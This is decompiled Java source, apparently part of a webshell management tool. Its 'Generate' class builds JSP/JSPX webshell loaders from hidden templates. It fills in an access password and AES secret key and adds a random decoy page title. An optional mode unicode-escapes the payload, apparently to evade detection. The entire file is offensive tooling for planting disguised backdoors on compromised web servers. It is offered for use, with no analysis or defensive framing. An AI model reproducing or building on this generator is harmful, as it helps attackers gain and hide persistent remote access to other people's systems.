/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.JavaAes_null;

import core.ApplicationContext;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import java.util.Random;
import util.Log;
import util.functions;

class Generate {
    private static final String[] SUFFIX = new String[]{"jsp", "jspx"};
    private static final String[] words = new String[]{"Amazing", "Fantastic", "Incredible", "Awesome", "Spectacular", "Wonderful", "Magnificent", "Superb", "Brilliant", "Marvelous", "Beautiful", "Exquisite", "Gorgeous", "Stunning", "Impressive", "Breathtaking", "Phenomenal", "Extraordinary", "Enchanting", "Captivating", "Fascinating", "Mesmerizing", "Astounding", "Unbelievable", "Unforgettable", "Remarkable", "Mind-blowing", "Astonishing", "Jaw-dropping", "Outstanding"};

    Generate() {
    }

    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
        byte[] data = null;
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            globalCode = globalCode.replace("{title}", Generate.generateRandomTitle());
            inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Code.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String)selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                if (suffix.equals(SUFFIX[1])) {
                    globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                    code = code.replace("<", "&lt;").replace(">", "&gt;");
                }
                template = ApplicationContext.isGodMode() ? template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code)) : template.replace("{globalCode}", globalCode).replace("{code}", code);
                data = template.getBytes();
            }
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        return Generate.GenerateShellLoder("", pass, secretKey, isBin);
    }

    public static String generateRandomTitle() {
        Random random = new Random();
        StringBuilder title = new StringBuilder();
        int wordCount = random.nextInt(3) + 1;
        for (int i = 0; i < wordCount; ++i) {
            int index = random.nextInt(words.length);
            title.append(words[index]);
            title.append(" ");
        }
        StringBuilder unicodeTitle = new StringBuilder();
        for (char c : title.toString().trim().toCharArray()) {
            unicodeTitle.append(String.format("\\u%04x", Character.valueOf(c)));
        }
        return unicodeTitle.toString();
    }
}

